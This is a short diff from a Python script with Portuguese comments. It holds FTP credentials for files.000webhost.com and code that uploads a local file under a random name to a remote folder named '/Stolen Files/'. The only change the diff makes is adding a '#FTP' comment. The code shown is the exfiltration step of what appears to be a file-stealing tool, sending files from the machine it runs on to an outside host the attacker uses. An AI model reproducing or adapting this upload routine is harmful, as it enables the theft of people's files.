@@ -15,7 +15,7 @@ FTPservername = "nomequalquer"
 FTPserverpass = "senhaqualquer"
 FTPserverhost = "files.000webhost.com"
 filerandomname = id_generator()
-
+#FTP
 FTP = ftplib.FTP(FTPserverhost,FTPservername,FTPserverpass) #Faz a conexão
 file = open(filelocation,"rb") #Abra o arquivo com o sinalizador rb. (read binary)
 FTP.storbinary("STOR /Stolen Files/" + filerandomname,file) #Armazena um binário (o arquivo)
